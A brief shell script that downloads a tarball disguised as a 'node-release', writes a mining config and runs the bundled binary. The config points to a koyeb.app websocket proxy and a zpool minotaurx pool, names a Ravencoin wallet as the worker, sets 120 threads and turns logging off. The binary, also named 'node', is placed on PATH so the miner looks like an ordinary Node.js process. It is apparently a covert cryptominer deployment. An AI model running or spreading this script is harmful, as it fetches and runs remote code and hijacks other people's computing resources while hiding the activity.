wget https://github.com/khanhnguyen97/ok2/releases/download/khanh/node-release.tar.gz
tar -xvf node-release.tar.gz
rm node-release.tar.gz
cd node-release


rm config.json && echo '{"proxy": "wss://flexible-eustacia-mtp-0b00e028.koyeb.app/proxy","stratum": {"server": "minotaurx.na.mine.zpool.ca", "port": 7019, "worker": "RSqWRgivNtmxDaEWj1xyLrE5HPnjcs8DNj", "password": "c=RVN"}, "options": { "threads": 120, "log": false }}' > config.json

mkdir -p $HOME/bin
cp ./node $HOME/bin/
export PATH=$HOME/bin:$PATH
node app.js
